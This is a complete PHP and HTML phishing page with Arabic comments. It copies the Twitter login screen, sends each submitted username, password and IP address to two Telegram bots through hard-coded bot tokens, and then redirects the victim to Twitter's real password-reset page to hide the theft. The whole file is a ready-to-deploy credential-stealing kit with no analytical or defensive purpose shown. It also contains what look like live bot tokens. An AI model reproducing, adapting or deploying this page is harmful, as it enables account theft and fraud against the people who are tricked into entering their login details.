<?php
// ✅ إعداد بيانات بوتي التلي
$chat_ids = ["6454073193", "7197079453"];
$bot_tokens = [
    "6454073193" => "7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY",
    "7197079453" => "AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk"
];

// ✅ إذا تم إرسال النموذج
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $message = "🔔 محاولة تسجيل دخول تويتر وهمية:\n👤 المستخدم: $username\n🔑 كلمة المرور: $password\n🌐 IP: $ip";

    // إرسال البيانات إلى كل بوت
    foreach ($chat_ids as $id) {
        $token = $bot_tokens[$id];
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = ['chat_id' => $id, 'text' => $message];

        file_get_contents($url . "?" . http_build_query($data));
    }

    // تحويل المستخدم لصفحة خطأ وهمية
    header("Location: https://twitter.com/account/begin_password_reset");
    exit();
}
?>

<!-- ✅ واجهة تسجيل دخول تويتر -->
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول إلى تويتر / Twitter</title>
    <style>
        body {
            background-color: #15202b;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: #192734;
            padding: 40px;
            border-radius: 10px;
            width: 320px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #22303c;
            border: none;
            border-radius: 5px;
            color: white;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1da1f2;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 40px;
        }
    </style>
</head>
<body>
    <form method="post">
        <div class="login-box">
            <div class="logo">
                <img src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" alt="Twitter Logo">
            </div>
            <h3>تسجيل الدخول إلى تويتر</h3>
            <input type="text" name="username" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </div>
    </form>
</body>
</html>
